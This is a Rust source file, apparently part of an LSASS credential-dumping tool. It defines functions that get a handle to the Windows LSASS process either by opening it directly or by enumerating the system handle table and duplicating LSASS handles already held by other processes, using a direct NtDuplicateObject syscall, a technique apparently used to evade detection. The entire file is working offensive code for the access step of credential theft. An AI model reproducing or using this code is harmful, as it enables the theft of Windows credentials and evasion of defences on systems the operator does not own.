use log::{debug, error, trace, warn};

use crate::core::handle::{get_extended_handle_info, get_type_index_by_name, HANDLES, HANDLE_TYPES};
use crate::core::process::get_all_process_except;
use crate::nt::ntdll::nt_success;
use crate::nt::system::{get_process_handle, NtOpenProcessAccess};
use crate::syscall::syscalls::NtDuplicateObject;
use crate::utils::utils::is_lsass;
use windows::Win32::Foundation::HANDLE;

const NT_CURRENT_PROCESS: HANDLE = HANDLE(-1isize as *mut core::ffi::c_void);


pub fn open_handle_to_lsass(lsass_pid: u32, dup: bool, permissions: u32, attributes: u32) -> Option<HANDLE> {
    debug!("Starting to open handle to LSASS");
    let mut hProcess : Option<HANDLE> = None;

    if dup{
        hProcess = Some(duplicate_lsass_handle(lsass_pid, permissions, attributes)?);
    } else if lsass_pid != 0 {
        debug!("Using NtOpenProcess to get handle to LSASS PID : {}", lsass_pid);
        hProcess = Some(get_process_handle(lsass_pid as usize, permissions, attributes)?);
    }

    if hProcess.is_some() {
        debug!("Successfully opened handle to LSASS : {:?}", hProcess.unwrap());
        return hProcess;
    }


    None
}


pub fn duplicate_lsass_handle(lsass_pid: u32, permissions: u32, attributes: u32) -> Option<HANDLE> {
    debug!("Dumping LSASS handle");
    get_extended_handle_info();

    unsafe {
        if let Some(handles) = &HANDLES {
            let process_type_index = get_type_index_by_name(HANDLE_TYPES::PROCESS_HANDLE_TYPE)?;

            for process in get_all_process_except(lsass_pid as usize) {

                let mut hprocess : Option<HANDLE> = None;

                for handle in handles.iter() {
                    // Make sure the handle is for the looking process
                    if handle.unique_process_id != process.pid { continue; }

                    // Make sure the handle is a process handle
                    if handle.object_type_index as u32 != process_type_index { continue; }

                    // Make sure the handle has the right permissions
                    if handle.granted_access & permissions != permissions { continue; }

                    if hprocess.is_none() {
                        // open a handle to the process with PROCESS_DUP_HANDLE
                        hprocess = get_process_handle(process.pid, NtOpenProcessAccess::PROCESS_DUP_HANDLE, 0);
                        if hprocess.is_none() {
                            break
                        }
                        trace!("Open handle: {:?}, hprocess : {:?}", handle.handle_value, hprocess);
                    }

                    // Duplicate the handle
                    let mut hDuped: HANDLE = HANDLE::default();

                    let status = NtDuplicateObject(
                        hprocess.unwrap(),
                        handle.handle_value,
                        NT_CURRENT_PROCESS,
                        &mut hDuped,
                        0,
                        attributes,
                        NtOpenProcessAccess::DUPLICATE_SAME_ACCESS as u32
                    );

                    if !nt_success(status) {
                        debug!("NtDuplicateObject failed: {:?}", status);
                        continue;
                    }

                    debug!("Dumped handle: {:?} for PID: {}", hDuped, process.pid);

                    if is_lsass(hDuped) {
                        debug!("LSASS handle dumped successfully : handle {:?}, process {}", handle.handle_value, process.pid);
                        return Some(hDuped)
                    }

                }
            }
        }
    }
None
}